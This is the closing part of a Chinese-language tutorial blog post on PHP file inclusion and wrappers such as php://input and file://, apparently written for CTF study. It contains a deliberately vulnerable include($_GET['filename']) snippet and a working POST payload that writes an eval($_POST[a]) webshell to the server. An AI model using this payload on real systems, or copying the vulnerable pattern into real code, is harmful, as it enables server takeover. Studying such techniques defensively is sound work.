+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>php://input</p>
+<p>php://input是一个“只读”的流，它允许我们直接读取POST上没有经过解析的原始数据 <!-- raw HTML omitted --></p>
+<p>enctype=&ldquo;multipart/form-data&rdquo; 的时候 php://input 是无效的 <!-- raw HTML omitted --></p>
+<p>需要同时开启 <code>allow_url_fopen</code> ，以及 <code>allow_url_include</code> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>我们可以利用 <code>php://input</code> 来执行POST中的php代码，从而写入一句话木马到服务器文件目录下 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=php://input
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">PHP</span> <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;lrfiInput.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php eval($_POST[a]) ?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-21_23-18-41_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>php://output</p>
+<p>测试 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<h4 id="file">&lt;//&gt;</h4>
+<p>&lt;//&gt; 代表了本地文件的路径，它也是默认的分装类，如果文件路径没有指明使用哪一个分装类，那就默认是 &lt;//&gt; <!-- raw HTML omitted --></p>
+<p>Usage <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/path/to/file.ext
+</span></span><span class="line"><span class="cl">relative/path/to/file.ext
+</span></span><span class="line"><span class="cl">fileInCwd.ext
+</span></span><span class="line"><span class="cl">C:/path/to/winfile.ext
+</span></span><span class="line"><span class="cl">C:\path\to\winfile.ext
+</span></span><span class="line"><span class="cl">\\smbserver\share\path\to\winfile.ext
+</span></span><span class="line"><span class="cl">file:///path/to/file.ext
+</span></span></code></pre></div><h4 id="data">data://</h4>
+<p>待补充 <!-- raw HTML omitted --></p>
+<h4 id="phar">phar://</h4>
+<p>phar只能用在本地文件上 <!-- raw HTML omitted --></p>
+<p>待补充 <!-- raw HTML omitted --></p>
+<h4 id="zip">zip://</h4>
+<p>待补充 <!-- raw HTML omitted --></p>
+<h3 id="reference">Reference</h3>
+<p><a class="link" href="https://www.freebuf.com/articles/web/182280.html"  target="_blank" rel="noopener"
+    >Web安全实战系列：文件包含漏洞</a> <!-- raw HTML omitted -->
+<a class="link" href="https://segmentfault.com/a/1190000018991087#item-6"  target="_blank" rel="noopener"
+    >PHP伪协议总结</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://dar1in9s.github.io/2020/02/03/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/#%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6"  target="_blank" rel="noopener"
+    >文件包含漏洞与php伪协议</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://paper.seebug.org/680/"  target="_blank" rel="noopener"
+    >利用 phar 拓展 php 反序列化漏洞攻击面</a> <!-- raw HTML omitted --></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/file_inclusion/">file_inclusion</a>
+        
+            <a href="/tags/ctf/">ctf</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on May 21, 2022 23:47 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/sql_injection_basic/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入：基础</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/sql_injection_file_rw/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入：文件读写</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;
+        
+        2022 Under The Ginkgo
+    </section>
+
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <section class="powerby">
+      <span id="busuanzi_container_site_pv" style='display:none'>
+        Viwe <span id="busuanzi_value_site_pv"></span> times
+      </span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#local-remote-file-inclusion-文件包含漏洞">Local/Remote File Inclusion 文件包含漏洞</a>
+      <ul>
+        <li><a href="#文件包含是什么-我们为什么要使用它">文件包含是什么？我们为什么要使用它？</a></li>
+        <li><a href="#文件包含漏洞产生的原因">文件包含漏洞产生的原因</a></li>
+        <li><a href="#local-file-inclusion-本地文件包含漏洞">Local File Inclusion 本地文件包含漏洞</a>
+          <ul>
+            <li><a href="#session-文件包含漏洞">Session 文件包含漏洞</a></li>
+            <li><a href="#常见限制绕过">常见限制绕过</a></li>
+          </ul>
+        </li>
+        <li><a href="#remote-file-inclusion-远程文件包含漏洞">Remote File Inclusion 远程文件包含漏洞</a>
+          <ul>
+            <li><a href="#常见绕过">常见绕过</a></li>
+          </ul>
+        </li>
+        <li><a href="#php-supported-protocols-and-wrappers-php伪协议">PHP Supported Protocols and Wrappers PHP伪协议</a>
+          <ul>
+            <li><a href="#php">php://</a></li>
+            <li><a href="#file">&lt;//&gt;</a></li>
+            <li><a href="#data">data://</a></li>
+            <li><a href="#phar">phar://</a></li>
+            <li><a href="#zip">zip://</a></li>
+          </ul>
+        </li>
+        <li><a href="#reference">Reference</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
